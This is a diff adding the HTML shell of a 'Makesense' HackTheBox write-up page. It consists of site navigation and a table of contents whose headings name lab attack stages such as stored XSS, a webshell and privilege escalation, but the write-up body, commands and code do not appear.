@@ -1,0 +1,3155 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://krozfu.github.io/writeups/hackthebox/machines/makesense/makesense/">
+      
+      
+        <link rel="prev" href="../../cicada/cicada/">
+      
+      
+        <link rel="next" href="../../../challenges/pwn/r0bob1rd/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../img/kzf-logo.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Makesense - KrozFu</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Makesense - KrozFu" />
+<meta property="og:image" content="https://krozfu.github.io/assets/images/social/writeups/hackthebox/machines/makesense/makesense.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:url" content="https://krozfu.github.io/writeups/hackthebox/machines/makesense/makesense/" />
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="Makesense - KrozFu" />
+<meta property="twitter:image" content="https://krozfu.github.io/assets/images/social/writeups/hackthebox/machines/makesense/makesense.png" />
+</head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="green">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#makesense" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="KrozFu" class="md-header__button md-logo" aria-label="KrozFu" data-md-component="logo">
+      
+  <img src="../../../../../img/kzf-logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            KrozFu
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Makesense
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="green"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="teal"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Whoami
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../articles/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Projects
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Writeups
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="KrozFu" class="md-nav__button md-logo" aria-label="KrozFu" data-md-component="logo">
+      
+  <img src="../../../../../img/kzf-logo.png" alt="logo">
+
+    </a>
+    KrozFu
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Whoami
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../articles/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Projects
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Projects
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../articles/nat-hping/nat-attack-hping/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuración NAT y ataque con hping MikroTik
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../articles/wireguard/wireguard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Implementación WireGuard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../articles/servidor/servidor-ubuntu/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Implementación Servidores
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../articles/kali-linux/kali-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Instalar Kali Linux VMware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../articles/pyphi/install-pyphi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Instalación PyPhi
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HackTheBox
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Machines
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Machines
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blue/blue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blue
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../lame/lame/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lame
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cicada/cicada/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cicada
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Makesense
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Makesense
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Recon / Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon / Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#key-observation-hardcoded-encryption-key" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key observation: hardcoded encryption key
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wordpress-ajax-endpoints-webagency-theme" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WordPress AJAX endpoints (webagency theme)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#foothold-stored-xss-via-encrypted-voice-results" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold — Stored XSS via encrypted voice results
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold — Stored XSS via encrypted voice results">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-cookie-exfil-proving-xss-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1 — Cookie exfil (proving XSS works)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-escalate-xss-to-admin-user-creation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2 — Escalate XSS to admin user creation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-login-to-wordpress-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3 — Login to WordPress admin
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-login-webshell-via-theme-file-editor-fixed-with-requestssession" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4 — Login + webshell via Theme File Editor (fixed with requests.Session)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-credentials-in-wp-configphp-ssh-as-walter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5 — Credentials in wp-config.php → SSH as walter
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege escalation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#internal-service-discovery-from-walter-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Internal service discovery (from walter SSH)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-admin-user-prey-automation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The admin user &amp; prey automation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-path-in-progress" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack path in progress
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ocr-save-as-feature-arbitrary-file-write-candidate" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OCR "Save as" feature — arbitrary file write candidate
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#root-the-save-as-feature-writes-straight-into-the-ocr-apps-own-webroot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Root — the "Save as" feature writes straight into the OCR app's own webroot
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mitigation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#timeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Timeline
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-used" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools used
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_3" id="__nav_3_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Challenges
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Challenges
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_3_1" id="__nav_3_2_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pwn
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Pwn
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../challenges/pwn/r0bob1rd/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    R0bob1rd
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_3_2" id="__nav_3_2_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Coding
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Coding
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../challenges/coding/primed-for-action/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Primed-for-Action
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_3_3" id="__nav_3_2_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hardware
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Hardware
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../challenges/hardware/the-needle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The-Needle
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_3_4" id="__nav_3_2_3_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IA/ML
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    IA/ML
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../challenges/ia-ml/like-a-gloves/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Like-a-Gloves
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackMe
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackMe
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tryhackme/pickle-rick/pickle-rick/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pickle Rick
+  
+
+    
